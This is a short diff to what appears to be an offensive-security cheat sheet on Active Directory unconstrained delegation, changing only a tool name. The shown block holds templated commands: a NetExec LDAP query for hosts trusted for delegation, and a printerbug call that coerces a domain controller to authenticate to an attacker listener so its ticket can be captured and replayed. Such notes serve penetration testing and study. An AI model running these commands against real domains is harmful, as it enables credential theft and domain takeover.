@@ -20,5 +20,5 @@ to you with printerbug — its TGT lands in your cache and you replay it into DC
 
 ```sh
 nxc ldap {{rhost}} -u {{user}} -p {{password}} --trusted-for-delegation
-printerbug.py {{domain}}/{{user}}:{{password}}@{{rhost}} {{lhost}}
+printerbug {{domain}}/{{user}}:{{password}}@{{rhost}} {{lhost}}
 ```
